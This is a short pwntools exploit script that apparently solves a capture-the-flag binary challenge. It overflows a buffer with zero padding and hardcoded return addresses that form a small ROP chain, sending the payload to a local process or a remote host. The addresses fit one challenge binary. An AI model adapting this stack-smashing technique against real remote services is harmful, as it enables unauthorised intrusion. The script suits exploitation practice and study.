#!/usr/bin/python3
import pwn
import sys

if __name__ == '__main__':
  localMode = len(sys.argv) != 3
  attack = b"88"
  target = None

  if localMode:
    target = pwn.process(sys.argv[1])  # Use local file
  else:
    server = sys.argv[1]
    port = int(sys.argv[2])
    target = pwn.remote(server, port)  # Connect to the server
  value = 0
  value = value.to_bytes(8,byteorder='little')
  ans = value
  ans += value
  ans += value
  value = 0x0000000000401a11
  value = value.to_bytes(8,byteorder='little')
  ans += value
  zero = 0x00000000004017f5
  zero = zero.to_bytes(8,byteorder='little')
  ans += zero
  ans += zero
  zero = 0x0000000000401c5a
  zero = zero.to_bytes(8,byteorder='little')
  ans += zero
  ans += zero
  target.send(ans)

  print(target.recvall().decode("utf-8", "ignore").strip())
